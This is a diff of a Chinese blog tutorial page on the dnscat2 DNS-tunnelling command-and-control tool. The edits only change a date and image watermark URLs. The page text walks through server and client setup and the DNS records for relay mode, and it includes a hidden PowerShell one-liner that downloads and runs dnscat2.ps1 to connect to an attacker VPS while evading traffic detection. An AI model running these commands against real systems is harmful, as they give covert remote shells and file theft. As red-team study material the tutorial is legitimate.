@@ -420,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-08
+                    2021-08-04
                 </div>
                 
 
@@ -485,7 +485,7 @@ sudo ruby ./dnscat2.rb -s 553 -c teamssix --no-cache</code></pre>
 <p><strong>启动客户端</strong>，这里以 Windows 下的 exe 版为例</p>
 <pre><code>dnscat --dns server=172.16.214.50,port=553 --secret=teamssix</code></pre>
 <p>连接成功后，会提示 <code>Session established!</code></p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_16-44-12.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_16-44-12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>dnscat2 的一些命令</p>
 <pre><code>sessions 或 windows                         查看当前会话
 session -i 1 或 window -i 1         进入 ID 为 1 的会话
@@ -493,19 +493,19 @@ shell                     建立交互式会话
 exec                        远程打开程序
 download              下载文件
 help                        查看支持的命令</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/WX20210607-165615@2x.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/WX20210607-165615@2x.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>抓下包，看看流量是什么样子的</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-01-52.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-01-52.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>不难看出，流量中有很多 dnscat 的字样，这样一来，虽然使用了 dns 协议，但是隐蔽性还是差了不少，接下来看看中继模式。</p>
 <h2 id="2、中继模式"><a href="#2、中继模式" class="headerlink" title="2、中继模式"></a>2、中继模式</h2><p>在中继模式下，需要自己有一个域名，并添加两条域名解析记录。</p>
 <p>首先创建一条 A 记录指向自己的公网 VPS 地址，之后创建一条 ns 记录指向 A 记录的子域名，示例如下：</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果想要判断自己的解析记录是否设置成功，可以通过以下方法进行判断。</p>
 <p>A 记录：直接通过 nslookup 进行判断，如果解析出了 IP 说明该项配置正确。</p>
 <pre><code>nslookup ns1.teamssix.com</code></pre>
 <p>ns 记录：在公网 VPS 上开启抓包，再<code>nslookup dc.teamssix.com</code>，如果在 VPS 上看到对应的流量记录，说明该项配置正确。</p>
 <pre><code>sudo tcpdump -n -i eth0 udp dst port 53</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_13-46-54.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_13-46-54.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p><strong>开启服务端</strong></p>
 <pre><code>sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open</code></pre>
 <pre><code>-e 指定安全级别，open 表示服务端允许客户端不进行加密</code></pre>
@@ -515,9 +515,9 @@ help                        查看支持的命令</code></pre>
 <pre><code>start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip</code></pre>
 <p>也可以把导入的命令和开启客户端的命令放在一起</p>
 <pre><code>powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-35-33.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-35-33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>再来抓下包，看看流量是什么样的</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-45-40.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-45-40.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>可以看出，流量中已经没有了 dnscat 的字样，这也是为什么在介绍部分说中继模式比直连模式更安全的原因。</p>
 <blockquote>
 <p>参考文章：</p>
